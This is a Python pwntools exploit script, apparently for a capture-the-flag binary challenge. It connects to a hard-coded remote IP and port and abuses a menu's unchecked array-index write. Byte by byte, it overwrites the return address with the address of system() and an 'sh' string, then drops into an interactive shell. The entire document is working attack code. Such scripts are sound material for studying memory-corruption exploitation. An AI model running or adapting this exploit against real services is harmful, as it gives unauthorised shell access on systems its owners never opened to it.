from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",41635)

binsh=0x0804859B
system=0x08048450
sh=0x08048987
offset=0x84

def writeaddr(off,va):
    io.recvuntil("5. exit")
    io.sendline("3")
    io.recvuntil("change:")
    io.sendline(str(off))
    io.sendlineafter("number:",str(va))

io.sendlineafter("have:","1")
io.sendlineafter("numbers","1")
writeaddr(offset,0x50)
writeaddr(offset+1,0x84)
writeaddr(offset+2,0x04)
writeaddr(offset+3,0x08)
offset+=8
writeaddr(offset,0x87)
writeaddr(offset+1,0x89)
writeaddr(offset+2,0x04)
writeaddr(offset+3,0x08)


io.sendline("5")

io.interactive()

